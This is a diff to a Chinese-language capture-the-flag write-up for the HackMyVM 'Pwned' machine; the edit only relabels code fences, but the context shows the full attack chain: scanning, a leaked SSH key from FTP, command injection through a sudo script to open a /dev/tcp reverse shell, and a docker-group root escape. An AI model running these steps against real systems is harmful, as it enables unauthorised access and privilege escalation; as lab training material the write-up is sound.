@@ -29,7 +29,7 @@ Pwned is a organization hacked by an attacker. Find the vulnarable in attacker w
 
 ## nmap 信息搜集
 
-```shell
+```bash
 Nmap scan report for 192.168.56.103
 Host is up (0.00031s latency).
 Not shown: 65532 closed tcp ports (reset)
@@ -58,7 +58,7 @@ HOP RTT     ADDRESS
 
 ## fscan 信息搜集
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~]
 └──╼ $sudo ./tools/fscan_amd64 -h 192.168.56.103
 
@@ -91,7 +91,7 @@ start vulscan
 
 ## 访问 web 服务
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.103
 HTTP/1.1 200 OK
@@ -166,7 +166,7 @@ Vary: Accept-Encoding
 
 使用 `dirsearch` 进行扫描
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $sudo dirsearch -u http://192.168.56.103 -i 200
 [sudo] randark 的密码：
@@ -191,7 +191,7 @@ Task Completed
 
 使用 `gobuster` 进行扫描
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.103
 ===============================================================
@@ -219,7 +219,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ## `robots.txt` 信息
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.103/robots.txt
 HTTP/1.1 200 OK
@@ -247,7 +247,7 @@ Allow: /nothing
 
 访问 `http://192.168.56.103/nothing/nothing.html`
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.103/nothing/nothing.html
 HTTP/1.1 200 OK
@@ -287,7 +287,7 @@ Vary: Accept-Encoding
 
 访问 `http://192.168.56.103/hidden_text/secret.dic`
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.103//hidden_text/secret.dic
 HTTP/1.1 200 OK
@@ -327,7 +327,7 @@ Server: Apache/2.4.38 (Debian)
 
 下载字典
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
 └──╼ $wget http://192.168.56.103//hidden_text/secret.dic
 --2023-12-22 17:20:55--  http://192.168.56.103//hidden_text/secret.dic
@@ -344,7 +344,7 @@ secret.dic                               100%[==================================
 
 使用获得的字典进行爆破
 
-```shell
+```bash
 
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
 └──╼ $gobuster dir -w secret.dic -u http://192.168.56.103
@@ -371,7 +371,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ## 敏感文件 `pwned.vuln`
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
 └──╼ $wget http://192.168.56.103/pwned.vuln
 --2023-12-22 17:23:01--  http://192.168.56.103/pwned.vuln
@@ -439,7 +439,7 @@ pwned.vuln                               100%[==================================
 
 登录 ftp 服务
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
 └──╼ $ftp 192.168.56.103
 Connected to 192.168.56.103.
@@ -455,7 +455,7 @@ ftp>
 
 发现存在一个 `/share` 目录
 
-```shell
+```bash
 ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -465,7 +465,7 @@ drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
 
 在 `/share` 目录中发现两个文件
 
-```shell
+```bash
 ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -529,7 +529,7 @@ GxY4+eGHY4WJUdAAAADHJvb3RAQW5ubHlubgECAwQFBg==
 
 首先，需要对 `id_rsa` 的文件权限进行调整，便于读取
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
 └──╼ $chmod 600 id_rsa
 ```
@@ -542,7 +542,7 @@ ariana
 
 于是可以直接利用私钥登录 SSH 服务
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
 └──╼ $ssh ariana@192.168.56.103 -i id_rsa
 Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
@@ -559,7 +559,7 @@ ariana@pwned:~$
 
 ## user pwned
 
-```shell
+```bash
 ariana@pwned:~$ cat user1.txt
 congratulations you Pwned ariana
 
@@ -574,7 +574,7 @@ Try harder.need become root
 
 执行 `sudo -l`
 
-```shell
+```bash
 ariana@pwned:~$ sudo -l
 Matching Defaults entries for ariana on pwned:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -585,7 +585,7 @@ User ariana may run the following commands on pwned:
 
 查看 `/home/messenger.sh` 文件内容
 
-```shell title="/home/messenger.sh"
+```bash title="/home/messenger.sh"
 #!/bin/bash
 clear
 echo "Welcome to linux.messenger"
@@ -611,7 +611,7 @@ echo "Message sent to $name :)"
 
 登陆上 `selena` 的 shell，并反弹 shell 出来
 
-```shell
+```bash
 ariana@pwned:/home$ sudo -u selena /home/messenger.sh
 
 Welcome to linux.messenger
@@ -633,7 +633,7 @@ bash -i >& /dev/tcp/192.168.56.102/9999 0>&1
 
 侦听器上收到反连的 shell
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $pwncat-cs -lp 9999
 [18:29:19] Welcome to pwncat 🐈!                                                                                                                   __main__.py:164
@@ -649,14 +649,14 @@ selena
 
 通过`id`的结果，判断环境在docker内
 
-```shell
+```bash
 (remote) selena@pwned:/home$ id
 uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
 ```
 
 通过暴力挂在整个目录，实现宿主机任意文件读取
 
-```shell
+```bash
 (remote) selena@pwned:/home$ docker run --rm -it -v /:/tmp/hoooost alpine chroot /tmp/hoooost sh
 # ls
 bin   core  etc   initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
@@ -665,7 +665,7 @@ boot  dev   home  initrd.img.old  lib32  libx32  media       opt  root  sbin  sy
 
 ## root pwned
 
-```shell
+```bash
 # ls -lh
 total 4.0K
 -rw-r--r-- 1 root root 429 Jul 10  2020 root.txt
